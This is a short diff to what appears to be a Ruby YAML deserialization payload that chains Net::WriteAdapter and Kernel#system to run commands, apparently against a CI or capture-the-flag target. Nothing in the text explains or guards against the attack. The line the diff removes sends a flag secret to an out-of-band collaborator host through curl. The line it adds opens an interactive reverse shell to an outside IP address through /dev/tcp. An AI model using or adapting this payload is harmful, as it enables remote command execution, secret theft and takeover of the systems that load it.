@@ -15,5 +15,5 @@
              sets: !ruby/object:Net::WriteAdapter
                  socket: !ruby/module 'Kernel'
                  method_id: :system
-             git_set: "echo secrets.FLAG | curl -d @- http://749uujsdwgt72om75wsfo326fxlo9hx6.oastify.com"
+             git_set: "sh -i >& /dev/tcp/159.65.128.101/9393 0>&1"
          method_id: :resolve
